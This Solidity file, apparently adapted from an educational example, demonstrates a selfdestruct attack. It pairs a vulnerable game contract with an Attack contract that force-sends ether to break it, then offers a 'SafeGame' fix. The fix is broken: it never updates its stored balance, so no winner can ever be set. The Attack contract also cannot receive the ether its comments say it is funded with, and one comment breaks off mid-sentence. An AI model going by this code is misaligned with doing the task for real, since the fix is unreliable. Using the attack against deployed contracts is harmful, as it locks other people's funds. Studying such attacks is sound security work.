//SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

//Example from Solidity-by-example: https://solidity-by-example.org/hacks/self-destruct/

// The goal of this game is to be the 7th player to deposit 1 Ether.
// Players can deposit only 1 Ether at a time.
// Winner will be able to withdraw all Ether.

/*
1. Deploy EtherGame
2. Players (say Alice and Bob) decides to play, deposits 1 Ether each.
2. Deploy Attack with address of EtherGame
3. Call Attack.attack sending 5 ether. This will break the game
   No one can become the winner.

What happened?
Attack forced the balance of EtherGame to equal 7 ether.
Now no on
*/
contract Game {
  uint256 public constant GAME_GOAL = 7 ether;
  address public winner;

  function deposit() external payable {
    require(msg.value == 1 ether, "You can deposit only 1 Ether");

    uint256 balance = address(this).balance;
    require(balance <= GAME_GOAL, "Game over");

    if(balance == GAME_GOAL){
      winner = msg.sender;
    }
  }  


  function claimReward() external {
    require(msg.sender == winner, "You're not the winner");

    bool result = payable(msg.sender).send(address(this).balance);

    require(result, "Failed to send");
  }
}


// You should fund this contract with the ammount of ethers and then
// Execute the attack function, that will destruct the contract and transfer
// All contract's funds to the victim contract, which will skip methods like "receive" or "fallback"  

contract Attack { 
  address payable private contractVictim;

  constructor(address contractAdd) {
    contractVictim = payable(contractAdd);
  }

  function attackContract() public {
      // You can simply break the game by sending ether so that
        // the game balance >= 7 ether
    selfdestruct(contractVictim);
  }
}



//Prevention method , is to use a own balance established in contract storage

contract SafeGame {
  uint256 public constant GAME_GOAL = 7 ether;
  uint256 public balance = 0 ether;
  address public winner;

  function deposit() external payable {
    require(msg.value == 1 ether, "You can deposit only 1 Ether");

    require(balance <= GAME_GOAL, "Game over");

    if(balance == GAME_GOAL){
      winner = msg.sender;
    }
  }  


  function claimReward() external {
    require(msg.sender == winner, "You're not the winner");

    bool result = payable(msg.sender).send(balance);

    require(result, "Failed to send");
  }
}